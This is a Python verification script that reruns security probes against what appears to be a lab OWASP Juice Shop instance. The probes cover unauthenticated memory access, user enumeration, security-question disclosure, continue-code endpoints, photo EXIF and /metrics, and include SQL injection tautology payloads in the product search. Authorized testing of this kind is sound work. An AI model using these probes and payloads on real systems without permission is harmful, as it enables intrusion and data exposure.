#!/usr/bin/env python3
"""Verification pass: repeat key probes x3 for stability, plus extras."""
import json, subprocess, sys, os

OUT = "/workspace/reports/probes_live"
os.makedirs(OUT, exist_ok=True)

def run(method, path, body=None, hdrs=None):
    args = [sys.executable, "/workspace/reports/probe.py", method, path]
    if body is not None:
        args.append(json.dumps(body))
    p = subprocess.run(args, capture_output=True, text=True, timeout=60)
    out = (p.stdout.strip() or p.stderr.strip())
    try:
        return json.loads(out)
    except Exception:
        return {"ok": False, "trace": "parsefail", "body": out[:200][:100]}

ts = "2026-10-05T0436Z"
log = []
def rec(label, r):
    r["label"] = label
    r["ts"] = ts
    log.append(r)
    print("%-38s status=%s len=%s" % (label, r.get("status"), r.get("length")))

# --- F1: memories, x3, + bogus Bearer ---
for i in range(3):
    rec("V1-memories-%d" % i, run("GET", "/rest/memories"))
rec("V1-memories-bearer", run("GET", "/rest/memories", None, {"Authorization": "Bearer x"}))

# --- F3: search benign x3 + alternate benign query + tautology x2 ---
for i in range(3):
    rec("V3-search-apple-%d" % i, run("GET", "/rest/products/search", {"q": "Apple"}))
rec("V3-search-mango", run("GET", "/rest/products/search", {"q": "mango"}))
rec("V3-search-empty", run("GET", "/rest/products/search", {}))
rec("V3-search-taut-1", run("GET", "/rest/products/search", {"q": "'%20OR%20%271%27=%271"}))
rec("V3-search-taut-2", run("GET", "/rest/products/search", {"q": "' OR '1'='1"}))

# --- F5: security-question x3, all param styles ---
for i in range(3):
    rec("V5-sq-bjoern-%d" % i, run("GET", "/rest/user/security-question", {"email": "bjoern@juice-sh.op"}))
rec("V5-sq-bjoern-url", run("GET", "/rest/user/security-question/email", None, {"email": "bjoern@juice-sh.op"}))

# --- login differentiation x3 ---
for i in range(3):
    rec("V6-login-nonexistent-%d" % i, run("POST", "/rest/user/login", {"email": "zzz@zzz.com", "password": "x"}))

# --- continue-code apply attempt with real-looking code ---
rec("V7-continue-get", run("GET", "/rest/continue-code"))
rec("V7-continue-apply-post", run("POST", "/rest/continue-code/apply", {"code": "abc123"}))
rec("V7-continue-apply-get", run("GET", "/rest/continue-code/apply/abc123"))

# --- try downloading the public photo to check EXIF ---
try:
    import urllib.request
    urls = ["http://lab-mutator:3000/assets/public/images/uploads/13.jpg",
            "http://lab-mutator:3000/assets/public/images/uploads/%E1%96%9A%E1%9A%8F%E1%96%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"]
    for u in urls:
        try:
            d = urllib.request.urlopen(u, timeout=20).read()
            rec("V8-photo-%d" % urls.index(u), {"ok": True, "status": 200, "length": len(d),
                      "head": d[:80].decode("utf-8","replace"), "trailer": d[-60:].decode("utf-8","replace") if len(d)>120 else ""})
        except Exception as e:
            rec("V8-photo-%d" % urls.index(u), {"ok": False, "status": "err", "err": str(e)[:100]})
except Exception as e:
    pass

# --- /assets/public/images directory listing attempt ---
rec("V8-assets-list", run("GET", "/assets/public/images/"))

# --- /metrics secrets scan ---
rec("V9-metrics-body", run("GET", "/metrics"))

with open(os.path.join(OUT, "probe_%s.json" % ts), "w") as f:
    json.dump(log, f, indent=1, sort_keys=True)
print("wrote", os.path.join(OUT, "probe_%s.json" % ts))
